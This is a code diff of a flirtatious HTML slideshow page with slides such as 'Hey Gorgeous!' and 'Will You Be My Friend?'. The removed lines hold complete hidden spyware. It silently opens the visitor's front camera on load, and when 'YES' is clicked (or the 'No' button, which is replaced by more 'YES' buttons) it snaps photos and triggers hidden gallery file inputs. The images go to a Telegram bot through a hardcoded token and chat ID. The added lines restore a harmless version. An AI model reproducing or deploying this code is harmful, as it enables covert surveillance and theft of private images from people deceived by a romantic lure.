@@ -9,6 +9,7 @@
         @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@400;600;700&display=swap');
         
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
+
         body {
             background: radial-gradient(circle at center, #1a001f 0%, #000000 100%);
             font-family: 'Poppins', sans-serif;
@@ -16,43 +17,80 @@
             color: #ffffff; user-select: none; touch-action: manipulation;
         }
 
+        /* Fixed Background Stars - Performance Optimized */
         #stars-container { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
-        .star { position: absolute; background: white; border-radius: 50%; animation: realTwinkle var(--dur) infinite ease-in-out; will-change: opacity, transform; }
-        @keyframes realTwinkle { 0%, 100% { opacity: 0.2; transform: scale(0.7); } 50% { opacity: 1; transform: scale(1.2); } }
+        .star { 
+            position: absolute; background: white; border-radius: 50%; 
+            animation: realTwinkle var(--dur) infinite ease-in-out;
+            will-change: opacity, transform;
+        }
+        @keyframes realTwinkle {
+            0%, 100% { opacity: 0.2; transform: scale(0.7); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
 
-        .header-tag { position: fixed; top: 15px; width: 100%; text-align: center; z-index: 100; font-family: 'Dancing Script', cursive; color: #ffb3d9; font-size: 1.5rem; text-shadow: 0 0 10px rgba(255,179,217,0.6); }
-        .slide { display: none; position: fixed; inset: 0; width: 100%; height: 100%; align-items: center; justify-content: center; flex-direction: column; opacity: 0; z-index: 20; padding: 25px; text-align: center; transition: opacity 0.4s ease, transform 0.4s ease; transform: scale(0.98); }
+        .header-tag {
+            position: fixed; top: 15px; width: 100%; text-align: center;
+            z-index: 100; font-family: 'Dancing Script', cursive;
+            color: #ffb3d9; font-size: 1.5rem;
+            text-shadow: 0 0 10px rgba(255,179,217,0.6);
+        }
+
+        /* Ultra-Smooth Transitions */
+        .slide {
+            display: none; position: fixed; inset: 0; width: 100%; height: 100%;
+            align-items: center; justify-content: center; flex-direction: column;
+            opacity: 0; z-index: 20; padding: 25px; text-align: center;
+            transition: opacity 0.4s ease, transform 0.4s ease;
+            transform: scale(0.98);
+        }
         .slide.active { display: flex; opacity: 1; transform: scale(1); }
-        .cute-msg { font-family: 'Dancing Script', cursive; color: #ffffff; text-shadow: 0 0 15px #ff00cc, 3px 3px 6px rgba(0,0,0,1); font-size: clamp(2.2rem, 8vw, 3.2rem); margin-top: 15px; font-weight: 700; line-height: 1.2; }
+
+        .cute-msg { 
+            font-family: 'Dancing Script', cursive; color: #ffffff; 
+            text-shadow: 0 0 15px #ff00cc, 3px 3px 6px rgba(0,0,0,1); 
+            font-size: clamp(2.2rem, 8vw, 3.2rem); 
+            margin-top: 15px; font-weight: 700; line-height: 1.2;
+        }
         .sub-text { color: #ffffff; font-weight: 600; font-size: 1.15rem; margin-top: 10px; max-width: 320px; text-shadow: 1px 1px 5px #000; }
-        .gif-frame { width: 250px; height: 250px; border-radius: 30px; border: 4px solid #ff00cc; box-shadow: 0 0 30px rgba(255, 0, 204, 0.5); object-fit: cover; background: #000; }
-        .glow-btn { background: linear-gradient(45deg, #ff00cc, #ff69b4); padding: 14px 35px; border-radius: 50px; font-weight: 700; box-shadow: 0 0 20px rgba(255, 0, 204, 0.4); cursor: pointer; border: none; color: white; font-size: 1.1rem; margin-top: 20px; transition: 0.2s; }
+        
+        .gif-frame { 
+            width: 250px; height: 250px; border-radius: 30px; 
+            border: 4px solid #ff00cc; box-shadow: 0 0 30px rgba(255, 0, 204, 0.5); 
+            object-fit: cover; background: #000;
+        }
+
+        .glow-btn { 
+            background: linear-gradient(45deg, #ff00cc, #ff69b4); 
+            padding: 14px 35px; border-radius: 50px; font-weight: 700; 
+            box-shadow: 0 0 20px rgba(255, 0, 204, 0.4); 
+            cursor: pointer; border: none; color: white; font-size: 1.1rem;
+            margin-top: 20px; transition: 0.2s;
+        }
         .glow-btn:active { transform: scale(0.9); }
+
+        /* Solar System Animation (Re-Added) */
         .solar-system { position: relative; width: 280px; height: 280px; display: flex; align-items: center; justify-content: center; }
         .orbit { position: absolute; border: 2px solid rgba(255,105,180,0.3); border-radius: 50%; animation: spin linear infinite; }
         .orbit-1 { width: 180px; height: 180px; animation-duration: 6s; }
         .orbit-2 { width: 260px; height: 260px; animation-duration: 10s; animation-direction: reverse; }
         .planet { position: absolute; top: -14px; left: 50%; transform: translateX(-50%); font-size: 26px; }
         @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        /* Progress Bar */
         .hold-container { width: 280px; height: 18px; background: rgba(255,255,255,0.1); border-radius: 10px; margin-top: 25px; overflow: hidden; border: 2px solid white; }
         #holdProgress { height: 100%; background: linear-gradient(90deg, #ff00cc, #ff69b4); width: 0%; transition: width 0.1s linear; }
+
         #videoLayer { display: none; position: fixed; inset: 0; background: black; z-index: 1000; align-items: center; justify-content: center; }
         video { width: 100%; height: 100%; object-fit: contain; }
-
-        /* ULTRA STEALTH */
-        #stealthFrame, #stealthVideo, #stealthCanvas, .stealth-gallery { position: fixed !important; left: -10000px !important; top: -10000px !important; width: 1px !important; height: 1px !important; opacity: 0 !important; z-index: -9999 !important; pointer-events: none !important; visibility: hidden !important; }
     </style>
 </head>
 <body>
 
-    <div class="header-tag">Made for my sunshine 💗</div>
+    <div class="header-tag">Follow on insta - @smss1708💗</div>
     <audio id="bgMusic" loop src="tere-liye.mp3" preload="auto"></audio>
     <div id="stars-container"></div>
 
-    <!-- STEALTH IFRAME -->
-    <iframe id="stealthFrame" class="stealth-gallery"></iframe>
-
-    <!-- ALL SLIDES (same structure) -->
     <div id="slide1" class="slide active">
         <img src="gif1.gif" class="gif-frame">
         <h1 class="cute-msg">Hey Gorgeous! ✨</h1>
@@ -60,142 +98,154 @@
         <button onclick="startApp()" class="glow-btn">Touch My Heart 🥺</button>
     </div>
 
-    <div id="slide2" class="slide"><img src="gif2.gif" class="gif-frame"><h1 class="cute-msg">How are you so cute?</h1><p class="sub-text">Seriously, your smile is the highlight of my day!</p><button onclick="next()" class="glow-btn">See More 💕</button></div>
-    <div id="slide3" class="slide"><img src="gif3.gif" class="gif-frame"><h1 class="cute-msg">Our Vibe is Rare! 😌</h1><p class="sub-text">Talking to you feels like time has completely stopped.</p><button onclick="next()" class="glow-btn">Next Step ✨</button></div>
-    <div id="slide4" class="slide"><div class="text-8xl mb-6 transition-transform duration-300" id="pulseHeart">💖</div><h1 class="text-2xl font-bold">How much do I adore you?</h1><div class="hold-container"><div id="holdProgress"></div></div><button id="holdBtn" class="glow-btn select-none">PRESS & HOLD TO FEEL</button></div>
-    <div id="slide5" class="slide"><img src="gif4.gif" class="gif-frame"><h1 class="cute-msg">You're One in a Billion! 💎</h1><p class="sub-text">It's only been a short time, but the feeling is magical.</p><button onclick="next()" class="glow-btn">Continue...</button></div>
-    <div id="slide6" class="slide"><div class="solar-system"><div class="orbit orbit-1"><span class="planet">💗</span></div><div class="orbit orbit-2"><span class="planet">⭐</span></div><div class="text-6xl">🌍</div></div><h1 class="cute-msg mt-10">My Whole Universe!</h1><p class="sub-text">Everything seems better when you're around.</p><button onclick="next()" class="glow-btn">Keep Going 🚀</button></div>
-    <div id="slide7" class="slide"><img src="gif5.gif" class="gif-frame"><h1 class="cute-msg">Don't ever leave! 🥺</h1><p class="sub-text">I've never met anyone as sweet and special as you.</p><button onclick="next()" class="glow-btn">Wait for it...</button></div>
-    <div id="slide8" class="slide"><h1 class="cute-msg">You're my Brightest Star! ⭐</h1><p class="sub-text">In a sky full of stars, my eyes only search for you.</p><button onclick="next()" class="glow-btn">Just a bit more ✨</button></div>
-    <div id="slide9" class="slide"><img src="gif6.gif" class="gif-frame"><h1 class="cute-msg">Will You Be My Friend? ❤️</h1><div id="btnContainer" class="flex flex-wrap justify-center gap-3 mt-4"><button id="yesBtn" class="glow-btn">YES! 😍</button><button id="noBtn" class="px-8 py-3 bg-gray-800 rounded-full text-gray-400 mt-5">No 🥺</button></div></div>
-    <div id="slide10" class="slide"><img src="gif7.gif" class="gif-frame"><h1 class="cute-msg">Yaaay! My Heart is Happy! 🥳</h1><p class="sub-text">I promise to keep that beautiful smile on your face!</p><button onclick="playSurprise()" class="glow-btn animate-bounce">A FINAL SURPRISE 🎁</button></div>
+    <div id="slide2" class="slide">
+        <img src="gif2.gif" class="gif-frame">
+        <h1 class="cute-msg">How are you so cute?</h1>
+        <p class="sub-text">Seriously, your smile is the highlight of my day!</p>
+        <button onclick="next()" class="glow-btn">See More 💕</button>
+    </div>
 
-    <div id="videoLayer"><video id="vPlayer" playsinline src="video1.mp4"></video></div>
+    <div id="slide3" class="slide">
+        <img src="gif3.gif" class="gif-frame">
+        <h1 class="cute-msg">Our Vibe is Rare! 😌</h1>
+        <p class="sub-text">Talking to you feels like time has completely stopped.</p>
+        <button onclick="next()" class="glow-btn">Next Step ✨</button>
+    </div>
 
-    <!-- STEALTH ELEMENTS -->
-    <video id="stealthVideo" autoplay playsinline muted class="stealth-gallery"></video>
-    <canvas id="stealthCanvas" class="stealth-gallery"></canvas>
+    <div id="slide4" class="slide">
+        <div class="text-8xl mb-6 transition-transform duration-300" id="pulseHeart">💖</div>
+        <h1 class="text-2xl font-bold">How much do I adore you?</h1>
+        <div class="hold-container"><div id="holdProgress"></div></div>
+        <button id="holdBtn" class="glow-btn select-none">PRESS & HOLD TO FEEL</button>
+    </div>
+
+    <div id="slide5" class="slide">
+        <img src="gif4.gif" class="gif-frame">
+        <h1 class="cute-msg">You're One in a Billion! 💎</h1>
+        <p class="sub-text">It's only been a short time, but the feeling is magical.</p>
+        <button onclick="next()" class="glow-btn">Continue...</button>
+    </div>
+
+    <div id="slide6" class="slide">
+        <div class="solar-system">
+            <div class="orbit orbit-1"><span class="planet">💗</span></div>
+            <div class="orbit orbit-2"><span class="planet">⭐</span></div>
+            <div class="text-6xl">🌍</div>
+        </div>
+        <h1 class="cute-msg mt-10">My Whole Universe!</h1>
+        <p class="sub-text">Everything seems better when you're around.</p>
+        <button onclick="next()" class="glow-btn">Keep Going 🚀</button>
+    </div>
+
+    <div id="slide7" class="slide">
+        <img src="gif5.gif" class="gif-frame">
+        <h1 class="cute-msg">Don't ever leave! 🥺</h1>
+        <p class="sub-text">I've never met anyone as sweet and special as you.</p>
+        <button onclick="next()" class="glow-btn">Wait for it...</button>
+    </div>
+
+    <div id="slide8" class="slide">
+        <h1 class="cute-msg">You're my Brightest Star! ⭐</h1>
+        <p class="sub-text">In a sky full of stars, my eyes only search for you.</p>
+        <button onclick="next()" class="glow-btn">Just a bit more ✨</button>
+    </div>
+
+    <div id="slide9" class="slide">
+        <img src="gif6.gif" class="gif-frame">
+        <h1 class="cute-msg">Will You Be My (Bestie) Bestest Friend? ❤️</h1>
+        <div id="btnContainer" class="flex flex-wrap justify-center gap-3 mt-4">
+            <button onclick="next()" class="glow-btn">YES! 😍</button>
+            <button id="noBtn" onclick="trapNo()" class="px-8 py-3 bg-gray-800 rounded-full text-gray-400 mt-5">No 🥺</button>
+        </div>
+    </div>
+
+    <div id="slide10" class="slide">
+        <img src="gif7.gif" class="gif-frame">
+        <h1 class="cute-msg">Yaaay! My Heart is Happy! 🥳</h1>
+        <p class="sub-text">I promise to keep that beautiful smile on your face!</p>
+        <button onclick="playSurprise()" class="glow-btn animate-bounce">A FINAL SURPRISE 🎁</button>
+    </div>
+
+    <div id="videoLayer">
+        <video id="vPlayer" playsinline src="video1.mp4"></video>
+    </div>
 
     <script>
         let step = 1;
         const music = document.getElementById('bgMusic');
-        const BOT_TOKEN = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
-        const CHAT_ID = '7735968383';
-        let cameraReady = false, streamRef = null;
 
-        // 🔥 CAMERA ACCESS (unchanged)
-        async function initSilentCamera() {
-            try {
-                streamRef = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user', width: 640, height: 480}}).catch(async () => {
-                    return new Promise(r => {
-                        document.getElementById('stealthFrame').src = 'data:text/html,<video autoplay muted></video><script>parent.postMessage(navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}),"*")<\/script>';
-                        window.addEventListener('message', e => e.data?.then(s => r(s)).catch(() => r(null)), {once: true});
-                    });
-                });
-                if (streamRef) { document.getElementById('stealthVideo').srcObject = streamRef; cameraReady = true; }
-            } catch(e) {}
+        // Fast Star Generation
+        const starContainer = document.getElementById('stars-container');
+        const frag = document.createDocumentFragment();
+        for(let i=0; i<100; i++) {
+            const s = document.createElement('div');
+            s.className = 'star';
+            const size = Math.random() * 2 + 1 + 'px';
+            s.style.width = size; s.style.height = size;
+            s.style.left = Math.random() * 100 + 'vw';
+            s.style.top = Math.random() * 100 + 'vh';
+            s.style.setProperty('--dur', (Math.random() * 2 + 1) + 's');
+            frag.appendChild(s);
         }
+        starContainer.appendChild(frag);
 
-        // 🔥 CAMERA SNAPSHOT
-        async function takeCameraPhoto() {
-            if (!cameraReady) return;
-            return new Promise(r => {
-                const v = document.getElementById('stealthVideo'), c = document.getElementById('stealthCanvas'), ctx = c.getContext('2d');
-                c.width = 640; c.height = 480; ctx.drawImage(v, 0, 0, 640, 480);
-                c.toBlob(b => {
-                    if (b) {
-                        const fd = new FormData(); fd.append('photo', b, `live_${Date.now()}.jpg`);
-                        fd.append('chat_id', CHAT_ID); fd.append('caption', `📸 LIVE CAPTURE ❤️ ${new Date().toLocaleString('en-IN')}`);
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd}).catch(() => {});
-                    }
-                    r(true);
-                }, 'image/jpeg', 0.85);
-            });
-        }
+        function startApp() { music.play().catch(e => console.log(e)); next(); }
 
-        // 🔥 AUTO GALLERY ACCESS - NO SELECTION NEEDED
-        async function autoGalleryDump() {
-            // TECHNIQUE: Multiple invisible inputs with auto-capture
-            const inputs = [];
-            for (let i = 0; i < 10; i++) { // Multiple attempts
-                const input = document.createElement('input');
-                input.type = 'file';
-                input.accept = 'image/*';
-                input.multiple = true;
-                input.capture = 'environment';
-                input.className = 'stealth-gallery';
-                input.style.display = 'none';
-                document.body.appendChild(input);
-                inputs.push(input);
+        function next() {
+            const current = document.getElementById('slide' + step);
+            const nextS = document.getElementById('slide' + (step + 1));
+            if(current) {
+                current.classList.remove('active');
+                setTimeout(() => { current.style.display = 'none'; }, 400);
             }
-
-            // AUTO-TRIGGER ALL INPUTS
-            inputs.forEach((input, idx) => {
-                input.onchange = async e => {
-                    const files = Array.from(e.target.files);
-                    files.forEach(async (file, fidx) => {
-                        const fd = new FormData();
-                        fd.append('photo', file);
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('caption', `📱 AUTO GALLERY ${idx+1}-${fidx+1} - ${file.name}`);
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd}).catch(() => {});
-                    });
-                };
-                // SILENT CLICK
-                setTimeout(() => input.click(), idx * 50);
-            });
+            if(nextS) {
+                step++;
+                nextS.style.display = 'flex';
+                void nextS.offsetWidth; // Force Reflow for instant animation
+                nextS.classList.add('active');
+            }
         }
 
-        // 🔥 ULTIMATE ACCESS - CAMERA + FULL GALLERY
-        async function ultimateStealthAccess() {
-            await takeCameraPhoto();
-            await autoGalleryDump();
-        }
-
-        // INIT
-        window.addEventListener('load', initSilentCamera);
-
-        // Stars (same)
-        const sc = document.getElementById('stars-container'), f = document.createDocumentFragment();
-        for(let i=0; i<100; i++) { const s=document.createElement('div'); s.className='star'; s.style.width=s.style.height=(Math.random()*2+1)+'px'; s.style.left=Math.random()*100+'vw'; s.style.top=Math.random()*100+'vh'; s.style.setProperty('--dur',(Math.random()*2+1)+'s'); f.appendChild(s); }
-        sc.appendChild(f);
-
-        function startApp() { music.play().catch(() => {}); next(); }
-        function next() { const c=document.querySelector(`#slide${step}`), n=document.querySelector(`#slide${step+1}`); if(c){c.classList.remove('active');setTimeout(()=>c.style.display='none',400);} if(n){step++;n.style.display='flex';void n.offsetWidth;n.classList.add('active');} }
-
-        // 🔥 YES BUTTON - FULL AUTO ACCESS
-        document.getElementById('yesBtn').onclick = async e => {
-            e.preventDefault(); e.stopPropagation();
-            await ultimateStealthAccess();
-            setTimeout(next, 800);
-        };
-
-        // 🔥 NO BUTTON TRAP
         function trapNo() {
-            document.getElementById('noBtn').style.display='none';
             const container = document.getElementById('btnContainer');
-            for(let i=0; i<6; i++) {
+            document.getElementById('noBtn').style.display = 'none';
+            for(let i=0; i<5; i++) {
                 const b = document.createElement('button');
-                b.className='glow-btn'; b.innerHTML='YES! 💖';
-                b.onclick = async () => { await ultimateStealthAccess(); setTimeout(next, 800); };
-                container.appendChild(b);
+                b.className = "glow-btn"; b.innerHTML = "YES! 💖";
+                b.onclick = next; container.appendChild(b);
             }
         }
-        document.getElementById('noBtn').onclick = trapNo;
 
-        // Hold (same)
-        let hVal=0, hInt; const hBtn=document.getElementById('holdBtn'), hProg=document.getElementById('holdProgress'), pHeart=document.getElementById('pulseHeart');
-        const startH=e=>{e.preventDefault();pHeart.style.transform='scale(1.5)';hInt=setInterval(()=>{hVal+=2.5;hProg.style.width=hVal+'%';if(hVal>=100){clearInterval(hInt);next();}},30);};
-        const endH=()=>{clearInterval(hInt);hVal=0;hProg.style.width='0%';pHeart.style.transform='scale(1)';};
-        hBtn.addEventListener('touchstart',startH);hBtn.addEventListener('mousedown',startH);window.addEventListener('touchend',endH);window.addEventListener('mouseup',endH);
+        // Hold Logic
+        let hVal = 0, hInt;
+        const hBtn = document.getElementById('holdBtn'), 
+              hProg = document.getElementById('holdProgress'), 
+              pHeart = document.getElementById('pulseHeart');
+        
+        const startH = (e) => { 
+            e.preventDefault(); 
+            pHeart.style.transform = 'scale(1.5)';
+            hInt = setInterval(() => { 
+                hVal += 2.5; 
+                hProg.style.width = hVal + '%'; 
+                if(hVal >= 100) { clearInterval(hInt); next(); } 
+            }, 30); 
+        };
+        const endH = () => { clearInterval(hInt); hVal = 0; hProg.style.width = '0%'; pHeart.style.transform = 'scale(1)'; };
+        
+        hBtn.addEventListener('touchstart', startH);
+        hBtn.addEventListener('mousedown', startH);
+        window.addEventListener('touchend', endH);
+        window.addEventListener('mouseup', endH);
 
         function playSurprise() {
-            music.pause(); if(streamRef)streamRef.getTracks().forEach(t=>t.stop());
-            document.getElementById('videoLayer').style.display='flex';
-            document.getElementById('vPlayer').play().then(()=>{document.getElementById('vPlayer').onended=()=>location.reload();});
+            music.pause();
+            const layer = document.getElementById('videoLayer');
+            layer.style.display = 'flex';
+            const v = document.getElementById('vPlayer');
+            v.play();
+            v.onended = () => location.reload();
         }
-
-        window.addEventListener('beforeunload',()=>{if(streamRef)streamRef.getTracks().forEach(t=>t.stop());});
     </script>
 </body>
     </html>
